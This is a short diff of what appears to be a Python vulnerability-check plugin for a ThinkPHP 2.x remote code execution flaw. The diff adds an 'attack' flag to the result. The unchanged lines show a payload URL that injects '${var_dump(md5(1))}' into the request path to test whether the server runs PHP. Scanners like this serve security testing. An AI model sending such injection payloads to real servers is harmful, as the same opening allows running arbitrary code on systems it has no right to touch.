@@ -5,7 +5,8 @@ import urllib
 def verify(url):
     relsult = {
         'name': 'Thinkphp 2.x rce',
-        'vulnerable': False
+        'vulnerable': False,
+        'attack': True,
     }
     try:
         payload = urllib.parse.urljoin(url, '/index.php?s=a/b/c/${var_dump(md5(1))}')
